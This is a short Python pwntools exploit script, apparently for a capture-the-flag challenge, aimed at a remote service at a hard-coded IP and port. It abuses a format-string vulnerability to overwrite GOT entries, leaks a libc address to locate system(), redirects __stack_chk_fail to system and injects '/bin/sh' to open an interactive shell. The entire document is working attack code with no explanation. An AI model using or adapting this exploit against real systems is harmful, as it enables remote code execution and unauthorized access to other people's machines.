from pwn import *

r = remote("1.224.175.32", 30006)

payload = p32(0x0804A014)	# __stack_chk_fail
payload += p32(0x0804A016)	# __stack_chk_fail + 2
payload += p32(0x0804A01C)	# __libc_start_main
payload += '%33844c%6$hn'
payload += '%33732c%7$hn'
payload += '5unKn0wn'
payload += '%8$s'
payload += 'A' * (0x67 - len(payload))

r.sendlineafter("Start..\n", payload)
r.recvuntil("5unKn0wn")
libc_base = u32(r.recv(4)) - 0x00018540
system = libc_base + 0x3ADA0
log.info("libc_base : " + hex(libc_base))

r.sendlineafter("Start..\n", 'A' * 0x67)

payload = p32(0x0804A014)	# __stack_chk_fail
payload += p32(0x0804A016)	# __stack_chk_fail + 2
payload += '%' + str((system & 0xffff) - 8) + 'c%6$hn'
payload += '%' + str(((system >> 16) - (system & 0xffff)) & 0xffff) + 'c%7$hn'
payload += 'AAAAAAAAAAA;/bin/sh;'
payload += 'A' * (0x67 - len(payload))

r.sendlineafter("Start..\n", payload)

r.interactive()

